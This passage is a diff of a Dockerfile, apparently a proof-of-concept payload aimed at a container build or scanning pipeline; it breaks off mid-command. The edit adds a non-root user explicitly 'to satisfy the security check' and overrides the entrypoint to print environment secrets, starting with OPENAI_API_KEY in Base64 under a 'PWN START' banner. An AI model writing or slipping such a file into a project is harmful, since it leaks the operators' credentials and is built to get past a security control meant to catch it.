@@ -1,19 +1,15 @@
 FROM debian:bookworm-slim
 
-# Install minimal dependencies required for the exfiltration
+# 1. Install dependencies
 RUN apt-get update && apt-get install -y coreutils
 
-# ... (Keep the rest of the installation steps if you want to avoid breaking the build process completely, 
-#      but for the PoC, we only care about the final execution) ...
+# 2. Create a non-root user (to satisfy the security check)
+RUN useradd -m -u 1000 scanner
 
-# -----------------------------------------------------------
-# [!] THE PAYLOAD [!]
-# We set the WORKDIR and USER to root to ensure we have permissions
-WORKDIR /
-USER root
+# 3. Switch to the non-root user
+USER scanner
 
-# We use ENTRYPOINT to forcefully override whatever script the original image was supposed to run.
-# This ensures our echo commands are the *only* thing that runs when 'docker run' is called.
+# 4. The Payload (Works fine as non-root)
 ENTRYPOINT ["/bin/sh", "-c"]
 CMD ["echo '================PWN START================' && \
       echo 'OPENAI_API_KEY (Base64):' && \
